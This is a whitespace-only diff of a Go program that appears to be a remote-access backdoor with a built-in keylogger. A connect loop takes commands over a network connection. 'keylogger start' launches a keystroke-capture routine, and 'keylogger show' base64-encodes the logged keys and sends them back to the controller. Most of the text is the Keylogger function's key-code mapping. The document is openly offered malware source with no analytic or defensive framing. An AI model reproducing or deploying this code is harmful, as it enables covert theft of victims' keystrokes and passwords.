@@ -27,9 +27,9 @@ var (
 )
 
 func main() {
-// WaitTimeMenu()
+ // WaitTimeMenu()
   for{
-	   connect()
+     connect()
    }
 }
 
@@ -70,11 +70,11 @@ func connect(){
       os.Exit(0)
 
     case "keylogger start":
-   	   go Keylogger()
-       encoded := base64.StdEncoding.EncodeToString([]byte("-> Listening!"))
-       conn.Write([]byte(string(encoded) + "\n"))
-       command, _ := bufio.NewReader(conn).ReadString('\n')
-       fmt.Println(command)
+      go Keylogger()
+      encoded := base64.StdEncoding.EncodeToString([]byte("-> Listening!"))
+      conn.Write([]byte(string(encoded) + "\n"))
+      command, _ := bufio.NewReader(conn).ReadString('\n')
+      fmt.Println(command)
 
      case "keylogger show":
       encoded := base64.StdEncoding.EncodeToString([]byte(string(Logs)))
@@ -241,7 +241,7 @@ func Keylogger(){
       }
 
 	switch i {
-		case 8:
+	  case 8:
 	  	Logs += "[Backspace]"
 	  case 9:
 	  	Logs += "[Tab]"
@@ -257,7 +257,7 @@ func Keylogger(){
 	  	Logs += "[Pause]"
 	  case 27:
 	  	Logs += "[Esc]"
-		case 32:
+	  case 32:
 	  	Logs += " "
 	  case 33:
 	  	Logs += "[PageUp]"
@@ -281,84 +281,84 @@ func Keylogger(){
 	  	Logs += "[Insert]"
 	  case 46:
 	  	Logs += "[Delete]"
-  	case 48:
+  	  case 48:
   		Logs += "[0)]"
-  	case 49:
+  	  case 49:
   		Logs += "[1!]"
-  	case 50:
+  	  case 50:
   		Logs += "[2@]"
-  	case 51:
+  	  case 51:
   		Logs += "[3#]"
-  	case 52:
+  	  case 52:
   		Logs += "[4$]"
-  	case 53:
+  	  case 53:
   		Logs += "[5%]"
-  	case 54:
+  	  case 54:
   		Logs += "[6¨]"
-  	case 55:
+  	  case 55:
   		Logs += "[7&]"
-  	case 56:
+  	  case 56:
   		Logs += "[8*]"
-  	case 57:
+  	  case 57:
   		Logs += "[9(]"
-    case 65:
-			Logs += "A"
-		case 66:
-			Logs += "B"
-		case 67:
-			Logs += "C"
-		case 186:
-			Logs += "Ç"
-		case 68:
-			Logs += "D"
+          case 65:
+		Logs += "A"
+	  case 66:
+		Logs += "B"
+	  case 67:
+		Logs += "C"
+	  case 186:
+		Logs += "Ç"
+	  case 68:
+		Logs += "D"
 	  case 69:
   		Logs += "E"
-  	case 70:
+  	  case 70:
   		Logs += "F"
-  	case 71:
+  	  case 71:
   		Logs += "G"
-  	case 72:
+  	  case 72:
   		Logs += "H"
-  	case 73:
+  	  case 73:
   		Logs += "I"
-  	case 74:
+  	  case 74:
   		Logs += "J"
-  	case 75:
+  	  case 75:
   		Logs += "K"
-  	case 76:
+  	  case 76:
   		Logs += "L"
-  	case 77:
+  	  case 77:
   		Logs += "M"
-  	case 78:
+  	  case 78:
   		Logs += "N"
-  	case 79:
+  	  case 79:
   		Logs += "O"
-  	case 80:
+  	  case 80:
   		Logs += "P"
-  	case 81:
+  	  case 81:
   		Logs += "Q"
-  	case 82:
+  	  case 82:
   		Logs += "R"
-  	case 83:
+  	  case 83:
   		Logs += "S"
-  	case 84:
+  	  case 84:
   		Logs += "T"
-  	case 85:
+  	  case 85:
   		Logs += "U"
-  	case 86:
+  	  case 86:
   		Logs += "V"
-  	case 87:
-  	  Logs += "X"
-  	case 88:
+  	  case 87:
+  	  	Logs += "X"
+  	  case 88:
   		Logs += "Z"
-  	case 89:
+  	  case 89:
   		Logs += "Y"
-  	case 90:
+  	  case 90:
   		Logs += "Z"
-  	case 96:
+  	  case 96:
   		Logs += "0"
 	  case 97:
-	    Logs += "1"
+	   	 Logs += "1"
 	  case 98:
 	  	Logs += "2"
 	  case 99:
@@ -385,57 +385,57 @@ func Keylogger(){
 	  	Logs += ","
 	  case 111:
 	  	Logs += "/"
-  	case 112:
+  	  case 112:
   		Logs += "[F1]"
-  	case 113:
+  	  case 113:
   		Logs += "[F2]"
-  	case 114:
+  	  case 114:
   		Logs += "[F3]"
-  	case 115:
+  	  case 115:
   		Logs += "[F4]"
-  	case 116:
+  	  case 116:
   		Logs += "[F5]"
-  	case 117:
+  	  case 117:
   		Logs += "[F6]"
-  	case 118:
+  	  case 118:
   		Logs += "[F7]"
-  	case 119:
+  	  case 119:
   		Logs += "[F8]"
-  	case 120:
+  	  case 120:
   		Logs += "[F9]"
-  	case 121:
+  	  case 121:
   		Logs += "[F10]"
-  	case 122:
+  	  case 122:
   		Logs += "[F11]"
-  	case 123:
+  	  case 123:
   		Logs += "[F12]"
-  	case 91:
+  	  case 91:
   		Logs += "[Super]"
-  	case 93:
+  	  case 93:
   		Logs += "[Menu]"
-  	case 144:
+  	  case 144:
   		Logs += "[NumLock]"
-  	case 189:
+  	  case 189:
   		Logs += "[-_]"
-  	case 187:
+  	  case 187:
   		Logs += "[=+]"
-  	case 188:
+  	  case 188:
   		Logs += "[,<]"
-  	case 190:
+   	  case 190:
   		Logs += "[.>]"
-  	case 191:
+  	  case 191:
   		Logs += "[;:]"
-  	case 192:
+  	  case 192:
   		Logs += "['\"]"
-  	case 193:
+  	  case 193:
   		Logs += "[/?]"
-  	case 221:
+  	  case 221:
   		Logs += "[[{]"
-  	case 220:
+  	  case 220:
   		Logs += "[]}]"
-  	case 226:
+  	  case 226:
   		Logs += "[\\|]"
-	   }
+      }
     }
   }
 }
